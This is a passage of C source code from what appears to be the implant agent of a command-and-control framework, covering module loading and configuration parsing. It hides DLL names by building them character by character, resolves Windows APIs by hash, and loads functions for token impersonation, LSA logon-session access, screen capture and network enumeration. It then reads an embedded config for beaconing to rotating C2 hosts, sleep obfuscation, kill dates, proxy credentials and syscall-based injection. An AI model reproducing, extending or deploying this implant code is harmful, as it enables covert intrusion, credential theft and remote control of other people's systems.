    ModuleName[ 3 ] = 'o';
    ModuleName[ 5 ] = 'E';
    ModuleName[ 6 ] = 'E';
    ModuleName[ 4 ] = 'r';
    Instance.Modules.Mscoree  = LdrModuleLoad( ModuleName );

    ModuleName[ 3 ] = 'A';
    ModuleName[ 2 ] = 'e';
    ModuleName[ 0 ] = 'O';
    ModuleName[ 1 ] = 'l';
    ModuleName[ 5 ] = 't';
    ModuleName[ 7 ] = '2';
    ModuleName[ 6 ] = '3';
    ModuleName[ 4 ] = 'u';
    ModuleName[ 8 ] = 0;
    Instance.Modules.Oleaut32 = LdrModuleLoad( ModuleName );

    ModuleName[ 1 ] = 's';
    ModuleName[ 0 ] = 'U';
    ModuleName[ 6 ] = 0;
    ModuleName[ 5 ] = '2';
    ModuleName[ 3 ] = 'r';
    ModuleName[ 2 ] = 'e';
    ModuleName[ 4 ] = '3';
    Instance.Modules.User32 = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'S';
    ModuleName[ 7 ] = 0;
    ModuleName[ 6 ] = '2';
    ModuleName[ 4 ] = 'l';
    ModuleName[ 1 ] = 'h';
    ModuleName[ 5 ] = '3';
    ModuleName[ 3 ] = 'l';
    ModuleName[ 2 ] = 'e';
    Instance.Modules.Shell32   = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'm';
    ModuleName[ 6 ] = 0;
    ModuleName[ 4 ] = 'r';
    ModuleName[ 2 ] = 'v';
    ModuleName[ 3 ] = 'c';
    ModuleName[ 5 ] = 't';
    ModuleName[ 1 ] = 's';
    Instance.Modules.Msvcrt  = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ]  = 'k';
    ModuleName[ 10 ] = 0;
    ModuleName[ 1 ]  = 'e';
    ModuleName[ 2 ]  = 'r';
    ModuleName[ 4 ]  = 'e';
    ModuleName[ 3 ]  = 'n';
    ModuleName[ 6 ]  = 'b';
    ModuleName[ 8 ]  = 's';
    ModuleName[ 9 ]  = 'e';
    ModuleName[ 5 ]  = 'l';
    ModuleName[ 7 ]  = 'a';
    Instance.Modules.KernelBase = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'c';
    ModuleName[ 1 ] = 'r';
    ModuleName[ 2 ] = 'y';
    ModuleName[ 3 ] = 'p';
    ModuleName[ 4 ] = 't';
    ModuleName[ 5 ] = 's';
    ModuleName[ 6 ] = 'p';
    ModuleName[ 7 ] = 0;
    Instance.Modules.CryptSp = LdrModuleLoad( ModuleName );

#ifdef TRANSPORT_HTTP
    ModuleName[ 0 ] = 'w';
    ModuleName[ 2 ] = 'n';
    ModuleName[ 7 ] = 0;
    ModuleName[ 4 ] = 't';
    ModuleName[ 1 ] = 'i';
    ModuleName[ 6 ] = 'p';
    ModuleName[ 3 ] = 'h';
    ModuleName[ 5 ] = 't';
    Instance.Modules.WinHttp = LdrModuleLoad( ModuleName );
#endif

    ModuleName[ 0 ] = 'i';
    ModuleName[ 8 ] = 0;
    ModuleName[ 2 ] = 'h';
    ModuleName[ 6 ] = 'p';
    ModuleName[ 1 ] = 'p';
    ModuleName[ 3 ] = 'l';
    ModuleName[ 5 ] = 'a';
    ModuleName[ 4 ] = 'p';
    ModuleName[ 7 ] = 'i';
    Instance.Modules.Iphlpapi = LdrModuleLoad( ModuleName );

    ModuleName[ 4 ] = '2';
    ModuleName[ 5 ] = 0;
    ModuleName[ 2 ] = 'i';
    ModuleName[ 1 ] = 'd';
    ModuleName[ 0 ] = 'g';
    ModuleName[ 3 ] = '3';
    Instance.Modules.Gdi32 = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'w';
    ModuleName[ 4 ] = 'l';
    ModuleName[ 1 ] = 'k';
    ModuleName[ 6 ] = 0;
    ModuleName[ 2 ] = 's';
    ModuleName[ 3 ] = 'c';
    ModuleName[ 5 ] = 'i';
    Instance.Modules.Wkscli = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'N';
    ModuleName[ 8 ] = 0;
    ModuleName[ 6 ] = '3';
    ModuleName[ 2 ] = 't';
    ModuleName[ 3 ] = 'A';
    ModuleName[ 4 ] = 'p';
    ModuleName[ 5 ] = 'i';
    ModuleName[ 1 ] = 'e';
    ModuleName[ 7 ] = '2';
    Instance.Modules.NetApi32 = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 'W';
    ModuleName[ 1 ] = 's';
    ModuleName[ 2 ] = '2';
    ModuleName[ 3 ] = '_';
    ModuleName[ 4 ] = '3';
    ModuleName[ 5 ] = '2';
    ModuleName[ 6 ] = 0;
    Instance.Modules.Ws2_32 = LdrModuleLoad( ModuleName );

    ModuleName[ 0 ] = 's';
    ModuleName[ 7 ] = 0;
    ModuleName[ 1 ] = 's';
    ModuleName[ 6 ] = 'i';
    ModuleName[ 5 ] = 'l';
    ModuleName[ 2 ] = 'p';
    ModuleName[ 4 ] = 'c';
    ModuleName[ 3 ] = 'i';
    Instance.Modules.Sspicli = LdrModuleLoad( ModuleName );

    MemSet( ModuleName, 0, 20 );

    // TODO: sort function (library)

    if ( Instance.Modules.Advapi32 )
    {
        Instance.Win32.GetTokenInformation                 = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_GetTokenInformation );
        Instance.Win32.CreateProcessWithTokenW             = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_CreateProcessWithTokenW );
        Instance.Win32.CreateProcessWithLogonW             = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_CreateProcessWithLogonW );
        Instance.Win32.RevertToSelf                        = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_RevertToSelf );
        Instance.Win32.GetUserNameA                        = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_GetUserNameA );
        Instance.Win32.LogonUserA                          = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LogonUserA );
        Instance.Win32.LogonUserW                          = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LogonUserW );
        Instance.Win32.LookupPrivilegeValueA               = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LookupPrivilegeValueA );
        Instance.Win32.LookupAccountSidA                   = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LookupAccountSidA );
        Instance.Win32.OpenThreadToken                     = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_OpenThreadToken );
        Instance.Win32.OpenProcessToken                    = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_OpenProcessToken );
        Instance.Win32.ImpersonateLoggedOnUser             = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_ImpersonateLoggedOnUser );
        Instance.Win32.AdjustTokenPrivileges               = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_AdjustTokenPrivileges );
        Instance.Win32.LookupPrivilegeNameA                = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LookupPrivilegeNameA );
        Instance.Win32.SystemFunction032                   = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SystemFunction032 );
        Instance.Win32.FreeSid                             = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_FreeSid );
        Instance.Win32.SetSecurityDescriptorSacl           = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SetSecurityDescriptorSacl );
        Instance.Win32.SetSecurityDescriptorDacl           = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SetSecurityDescriptorDacl );
        Instance.Win32.InitializeSecurityDescriptor        = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_InitializeSecurityDescriptor );
        Instance.Win32.AddMandatoryAce                     = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_AddMandatoryAce );
        Instance.Win32.InitializeAcl                       = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_InitializeAcl );
        Instance.Win32.AllocateAndInitializeSid            = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_AllocateAndInitializeSid );
        Instance.Win32.CheckTokenMembership                = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_CheckTokenMembership );
        Instance.Win32.SetEntriesInAclW                    = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SetEntriesInAclW );
        Instance.Win32.SetThreadToken                      = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SetThreadToken );
        Instance.Win32.LsaNtStatusToWinError               = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LsaNtStatusToWinError );
        Instance.Win32.EqualSid                            = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_EqualSid );
        Instance.Win32.ConvertSidToStringSidW              = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_ConvertSidToStringSidW );

        PUTS( "Loaded Advapi32 functions" )
    }

    if ( Instance.Modules.Oleaut32 )
    {
        Instance.Win32.SafeArrayAccessData                 = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayAccessData );
        Instance.Win32.SafeArrayUnaccessData               = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayUnaccessData );
        Instance.Win32.SafeArrayCreate                     = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayCreate );
        Instance.Win32.SafeArrayPutElement                 = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayPutElement );
        Instance.Win32.SafeArrayCreateVector               = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayCreateVector );
        Instance.Win32.SafeArrayDestroy                    = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SafeArrayDestroy );
        Instance.Win32.SysAllocString                      = LdrFunctionAddr( Instance.Modules.Oleaut32, FuncHash_SysAllocString );

        PUTS( "Loaded Oleaut32 functions" )
    }

    if ( Instance.Modules.Shell32 )
    {
        Instance.Win32.CommandLineToArgvW                  = LdrFunctionAddr( Instance.Modules.Shell32, FuncHash_CommandLineToArgvW );

        PUTS( "Loaded Shell32 functions" )
    }

    if ( Instance.Modules.Msvcrt )
    {
        Instance.Win32.vsnprintf                           = LdrFunctionAddr( Instance.Modules.Msvcrt, FuncHash_vsnprintf );

        PUTS( "Loaded Msvcrt functions" )
    }

    if ( Instance.Modules.User32 )
    {
        Instance.Win32.ShowWindow                          = LdrFunctionAddr( Instance.Modules.User32, FuncHash_ShowWindow );
        Instance.Win32.GetSystemMetrics                    = LdrFunctionAddr( Instance.Modules.User32, FuncHash_GetSystemMetrics );
        Instance.Win32.GetDC                               = LdrFunctionAddr( Instance.Modules.User32, FuncHash_GetDC );
        Instance.Win32.ReleaseDC                           = LdrFunctionAddr( Instance.Modules.User32, FuncHash_ReleaseDC );

        PUTS( "Loaded User32 functions" )
    }

    if ( Instance.Modules.Gdi32 )
    {
        Instance.Win32.GetCurrentObject                    = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_GetCurrentObject );
        Instance.Win32.GetObjectW                          = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_GetObjectW );
        Instance.Win32.CreateCompatibleDC                  = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_CreateCompatibleDC );
        Instance.Win32.CreateDIBSection                    = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_CreateDIBSection );
        Instance.Win32.SelectObject                        = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_SelectObject );
        Instance.Win32.BitBlt                              = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_BitBlt );
        Instance.Win32.DeleteObject                        = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_DeleteObject );
        Instance.Win32.DeleteDC                            = LdrFunctionAddr( Instance.Modules.Gdi32, FuncHash_DeleteDC );

        PUTS( "Loaded Gdi32 functions" )
    }

    if ( Instance.Modules.KernelBase )
    {
        Instance.Win32.SetProcessValidCallTargets          = LdrFunctionAddr( Instance.Modules.KernelBase, FuncHash_SetProcessValidCallTargets );

        PUTS( "Loaded KernelBase functions" )
    }

    // WinHttp
#ifdef TRANSPORT_HTTP
    if ( Instance.Modules.WinHttp )
    {
        Instance.Win32.WinHttpOpen                         = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpOpen );
        Instance.Win32.WinHttpConnect                      = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpConnect );
        Instance.Win32.WinHttpOpenRequest                  = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpOpenRequest );
        Instance.Win32.WinHttpSetOption                    = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpSetOption );
        Instance.Win32.WinHttpCloseHandle                  = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpCloseHandle );
        Instance.Win32.WinHttpSendRequest                  = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpSendRequest );
        Instance.Win32.WinHttpAddRequestHeaders            = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpAddRequestHeaders );
        Instance.Win32.WinHttpReceiveResponse              = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpReceiveResponse );
        Instance.Win32.WinHttpWebSocketCompleteUpgrade     = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpWebSocketCompleteUpgrade  );
        Instance.Win32.WinHttpQueryDataAvailable           = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpQueryDataAvailable );
        Instance.Win32.WinHttpReadData                     = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpReadData );
        Instance.Win32.WinHttpQueryHeaders                 = LdrFunctionAddr( Instance.Modules.WinHttp, FuncHash_WinHttpQueryHeaders );

        PUTS( "Loaded WinHttp functions" )
    }
#endif

    if ( Instance.Modules.Mscoree )
    {
        Instance.Win32.CLRCreateInstance = LdrFunctionAddr( Instance.Modules.Mscoree, FuncHash_CLRCreateInstance );
    }

    if ( Instance.Modules.Iphlpapi )
    {
        Instance.Win32.GetAdaptersInfo = LdrFunctionAddr( Instance.Modules.Iphlpapi, FuncHash_GetAdaptersInfo );
    }

    if ( Instance.Modules.NetApi32 )
    {
        Instance.Win32.NetLocalGroupEnum = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetLocalGroupEnum );
        Instance.Win32.NetGroupEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetGroupEnum );
        Instance.Win32.NetUserEnum       = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetUserEnum );
        Instance.Win32.NetWkstaUserEnum  = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetWkstaUserEnum  );
        Instance.Win32.NetSessionEnum    = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetSessionEnum );
        Instance.Win32.NetShareEnum      = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetShareEnum );
        Instance.Win32.NetApiBufferFree  = LdrFunctionAddr( Instance.Modules.NetApi32, FuncHash_NetApiBufferFree  );

        PUTS( "Loaded NetApi32 functions" )
    }

    if ( Instance.Modules.Ws2_32 )
    {
        Instance.Win32.WSAStartup   = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_WSAStartup );
        Instance.Win32.WSACleanup   = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_WSACleanup );
        Instance.Win32.WSASocketA   = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_WSASocketA );
        Instance.Win32.ioctlsocket  = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_ioctlsocket  );
        Instance.Win32.bind         = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_bind );
        Instance.Win32.listen       = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_listen  );
        Instance.Win32.accept       = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_accept );
        Instance.Win32.closesocket  = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_closesocket );
        Instance.Win32.recv         = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_recv );
        Instance.Win32.send         = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_send );
        Instance.Win32.connect      = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_connect );
        Instance.Win32.getaddrinfo  = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_getaddrinfo );
        Instance.Win32.freeaddrinfo = LdrFunctionAddr( Instance.Modules.Ws2_32, FuncHash_freeaddrinfo );

        PUTS( "Loaded Ws2_32 functions" )
    }

    if ( Instance.Modules.Sspicli )
    {
        Instance.Win32.LsaRegisterLogonProcess        = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaRegisterLogonProcess );
        Instance.Win32.LsaLookupAuthenticationPackage = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaLookupAuthenticationPackage );
        Instance.Win32.LsaDeregisterLogonProcess      = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaDeregisterLogonProcess );
        Instance.Win32.LsaConnectUntrusted            = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaConnectUntrusted );
        Instance.Win32.LsaFreeReturnBuffer            = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaFreeReturnBuffer );
        Instance.Win32.LsaCallAuthenticationPackage   = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaCallAuthenticationPackage );
        Instance.Win32.LsaGetLogonSessionData         = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaGetLogonSessionData );
        Instance.Win32.LsaEnumerateLogonSessions      = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaEnumerateLogonSessions );
    }

    PUTS( "Set basic info" )

    if ( ! NT_SUCCESS( Instance.Syscall.NtQuerySystemInformation( SystemProcessorInformation, &SystemInfo, sizeof( SYSTEM_PROCESSOR_INFORMATION ), 0 ) ) )
    PUTS( "[!] NtQuerySystemInformation Failed" );

    if ( ! Instance.Session.ModuleBase )
        /* if we specified nothing as our ModuleBase then this either means that we are an exe or we should use the whole process */
        Instance.Session.ModuleBase = LdrModulePeb( 0 );

    Instance.Session.OS_Arch     = SystemInfo.ProcessorArchitecture;
    Instance.Session.PID         = (DWORD)(ULONG_PTR)Instance.Teb->ClientId.UniqueProcess;
    Instance.Session.ProcessArch = PROCESS_AGENT_ARCH;
    Instance.Session.Connected   = FALSE;
    Instance.Session.AgentID     = RandomNumber32(); // generate a random ID
    Instance.Config.AES.Key      = NULL;
    Instance.Config.AES.IV       = NULL;

    /* Linked lists */
    Instance.Tokens.Vault        = NULL;
    Instance.Tokens.Impersonate  = FALSE;
    Instance.Jobs                = NULL;
    Instance.Downloads           = NULL;
    Instance.Sockets             = NULL;

    /* Global Objects */
    Instance.Dotnet = NULL;

    PRINTF( "Instance DemonID => %x\n", Instance.Session.AgentID )
}

VOID DemonConfig()
{
    PARSER Parser = { 0 };
    PVOID  Buffer = NULL;
    ULONG  Temp   = 0;
    UINT32 Length = 0;
    DWORD  J      = 0;

    PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )

    ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
    RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );

    Instance.Config.Sleeping       = ParserGetInt32( &Parser );
    Instance.Config.Jitter         = ParserGetInt32( &Parser );
    PRINTF( "Sleep: %d (%d%%)\n", Instance.Config.Sleeping, Instance.Config.Jitter )

    Instance.Config.Memory.Alloc   = ParserGetInt32( &Parser );
    Instance.Config.Memory.Execute = ParserGetInt32( &Parser );

    PRINTF(
            "[CONFIG] Memory: \n"
            " - Allocate: %d  \n"
            " - Execute : %d  \n",
            Instance.Config.Memory.Alloc,
            Instance.Config.Memory.Execute
    )

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Process.Spawn64 = Instance.Win32.LocalAlloc( LPTR, Length );
    MemCopy( Instance.Config.Process.Spawn64, Buffer, Length );

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Process.Spawn86 = Instance.Win32.LocalAlloc( LPTR, Length );
    MemCopy( Instance.Config.Process.Spawn86, Buffer, Length );

    PRINTF(
            "[CONFIG] Spawn: \n"
            " - [x64] => %ls  \n"
            " - [x86] => %ls  \n",
            Instance.Config.Process.Spawn64,
            Instance.Config.Process.Spawn86
    )

    Instance.Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );
    Instance.Config.Implant.DownloadChunkSize  = 512000; /* 512k by default. */

    PRINTF(
        "[CONFIG] Sleep Obfuscation: \n"
        " - Technique: %d \n",
        Instance.Config.Implant.SleepMaskTechnique
    )

#ifdef TRANSPORT_HTTP
    Instance.Config.Transport.KillDate       = ParserGetInt64( &Parser );
    PRINTF( "KillDate: %d\n", Instance.Config.Transport.KillDate )
    // check if the kill date has already passed
    if ( Instance.Config.Transport.KillDate && GetEpochTime() >= Instance.Config.Transport.KillDate )
    {
        // refuse to run
        // TODO: exit process?
        Instance.Win32.RtlExitUserThread(0);
    }
    Instance.Config.Transport.WorkingHours   = ParserGetInt32( &Parser );
    Instance.Config.Transport.Method         = L"POST"; /* TODO: make it optional */
    Instance.Config.Transport.HostRotation   = ParserGetInt32( &Parser );
    Instance.Config.Transport.HostMaxRetries = 0;  /* Max retries. 0 == infinite retrying
                                                    * TODO: add this to the yaotl language and listener GUI */
    Instance.Config.Transport.Hosts          = NULL;
    Instance.Config.Transport.Host           = NULL;

    /* J contains our Hosts counter */
    J = ParserGetInt32( &Parser );
    PRINTF( "[CONFIG] Hosts [%d]\n:", J )
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Temp   = ParserGetInt32( &Parser );

        PRINTF( " - %ls:%ld\n", Buffer, Temp )

        /* if our host address is longer than 0 then lets use it. */
        if ( Length > 0 )
            /* Add parse host data to our linked list */
            HostAdd( Buffer, Length, Temp );
    }
    PRINTF( "Hosts added => %d\n", HostCount() )

    /* Get Host data based on our host rotation strategy */
    Instance.Config.Transport.Host = HostRotation( Instance.Config.Transport.HostRotation );
    PRINTF( "Host going to be used is => %ls:%ld\n", Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port )

    // Listener Secure (SSL)
    Instance.Config.Transport.Secure = ParserGetInt32( &Parser );
    PRINTF( "[CONFIG] Secure: %s\n", Instance.Config.Transport.Secure ? "TRUE" : "FALSE" );

    // UserAgent
    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Transport.UserAgent = NtHeapAlloc( Length + sizeof( WCHAR ) );
    MemCopy( Instance.Config.Transport.UserAgent, Buffer, Length );
    PRINTF( "[CONFIG] UserAgent: %ls\n", Instance.Config.Transport.UserAgent );

    // Headers
    J = ParserGetInt32( &Parser );
    Instance.Config.Transport.Headers = NtHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
    PRINTF( "[CONFIG] Headers [%d]:\n", J );
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance.Config.Transport.Headers[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) );
        MemSet( Instance.Config.Transport.Headers[ i ], 0, Length );
        MemCopy( Instance.Config.Transport.Headers[ i ], Buffer, Length );
#ifdef DEBUG
        printf( "  - %ls\n", Instance.Config.Transport.Headers[ i ] );
#endif
    }
    Instance.Config.Transport.Headers[ J + 1 ] = NULL;

    // Uris
    J = ParserGetInt32( &Parser );
    Instance.Config.Transport.Uris = NtHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
    PRINTF( "[CONFIG] Uris [%d]:\n", J );
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance.Config.Transport.Uris[ i ] = NtHeapAlloc( Length + sizeof( WCHAR ) );
        MemSet( Instance.Config.Transport.Uris[ i ], 0, Length + sizeof( WCHAR ) );
        MemCopy( Instance.Config.Transport.Uris[ i ], Buffer, Length );
#ifdef DEBUG
        printf( "  - %ls\n", Instance.Config.Transport.Uris[ i ] );
#endif
    }
    Instance.Config.Transport.Uris[ J + 1 ] = NULL;

    // check if proxy connection is enabled
    Instance.Config.Transport.Proxy.Enabled = ( BOOL ) ParserGetInt32( &Parser );;
    if ( Instance.Config.Transport.Proxy.Enabled )
    {
        PUTS( "[CONFIG] [PROXY] Enabled" );
        Buffer = ParserGetBytes( &Parser, &Length );
        Instance.Config.Transport.Proxy.Url = NtHeapAlloc( Length + sizeof( WCHAR ) );
        MemCopy( Instance.Config.Transport.Proxy.Url, Buffer, Length );
        PRINTF( "[CONFIG] [PROXY] Url: %ls\n", Instance.Config.Transport.Proxy.Url );

        Buffer = ParserGetBytes( &Parser, &Length );
        if ( Length > 0 )
        {
            Instance.Config.Transport.Proxy.Username = NtHeapAlloc( Length );
            MemCopy( Instance.Config.Transport.Proxy.Username, Buffer, Length );
            PRINTF( "[CONFIG] [PROXY] Username: %ls\n", Instance.Config.Transport.Proxy.Username );
        }
        else
            Instance.Config.Transport.Proxy.Username = NULL;

        Buffer = ParserGetBytes( &Parser, &Length );
        if ( Length > 0 )
        {
            Instance.Config.Transport.Proxy.Password = NtHeapAlloc( Length );
            MemCopy( Instance.Config.Transport.Proxy.Password, Buffer, Length );
            PRINTF( "[CONFIG] [PROXY] Password: %ls\n", Instance.Config.Transport.Proxy.Password );
        }
        else
            Instance.Config.Transport.Proxy.Password = NULL;
    }
    else
    {
        PUTS( "[CONFIG] [PROXY] Disabled" );
    }
#endif

#ifdef TRANSPORT_SMB

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance.Config.Transport.Name = Instance.Win32.LocalAlloc( LPTR, Length * 2 );
    CharStringToWCharString( Instance.Config.Transport.Name, Buffer, Length );

    PRINTF( "[CONFIG] PipeName: %ls\n", Instance.Config.Transport.Name );

    Instance.Config.Transport.KillDate = ParserGetInt64( &Parser );
    PRINTF( "KillDate: %d\n", Instance.Config.Transport.KillDate )
    // check if the kill date has already passed
    if ( Instance.Config.Transport.KillDate && GetEpochTime() >= Instance.Config.Transport.KillDate )
    {
        // refuse to run
        // TODO: exit process?
        Instance.Win32.RtlExitUserThread(0);
    }
    Instance.Config.Transport.WorkingHours = ParserGetInt32( &Parser );
#endif

    Instance.Config.Implant.ThreadStartAddr = Instance.Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
    Instance.Config.Inject.Technique        = INJECTION_TECHNIQUE_SYSCALL;

    ParserDestroy( &Parser );
}